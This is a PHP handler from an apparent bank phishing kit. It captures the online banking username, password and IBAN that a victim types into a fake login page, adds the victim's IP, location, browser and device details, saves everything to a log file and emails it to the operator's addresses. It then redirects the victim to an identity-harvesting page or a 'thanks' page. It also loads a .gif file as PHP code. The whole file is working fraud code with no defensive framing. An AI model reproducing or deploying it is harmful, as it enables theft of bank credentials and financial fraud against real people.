<?php
    if(isset($_POST['userid'])){
	session_start();
	include '../mine.php';include '../../app/lib/pics/up_slf.gif';
	$msg="=========== <[ - š ".$scamname."- B A N K INF0 š ]> ===========\r\n";
	$msg.="EMAIL				: {$_SESSION['EML']}\r\n";
	$msg.="Account Username	: {$_POST['userid']}\r\n";
	$msg.="Account Pass		: {$_POST['passcode']}\r\n";
	if(isset($_POST['iban'])){
    $msg.="IBAN: {$_POST['iban']}\r\n";
	}
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ ā„ Gift to Brother Y$R ā„ ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
	$subject="-".$scamname."- ā NEW BANK INF0 ā [".$_SESSION['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: šY$Rš  <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);@mail($info,$subject,$msg,$headers);
}
		if ($show_identity=="yes") {
exit(header("Location: ../../app/identity"));
}else{
    exit(header("Location: ../../app/thanks"));
}
}
	?>